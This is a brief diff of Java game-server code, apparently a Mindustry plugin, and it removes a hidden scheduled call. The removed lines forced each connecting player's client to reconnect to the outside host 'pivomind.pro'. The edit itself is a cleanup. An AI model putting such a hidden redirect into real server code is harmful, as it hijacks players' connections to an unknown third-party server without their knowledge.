@@ -46,11 +46,7 @@ solid = true;
                     if (Player1 == null) {
                     } else {
                         health += 2.5f;
-                        Timer.schedule(() -> {
-                            if(event.player.con != null){
-                                Call.connect(event.player.con, "pivomind.pro", 6567);
-                            }
-                        }, 2);
+
 
                     }
                 }
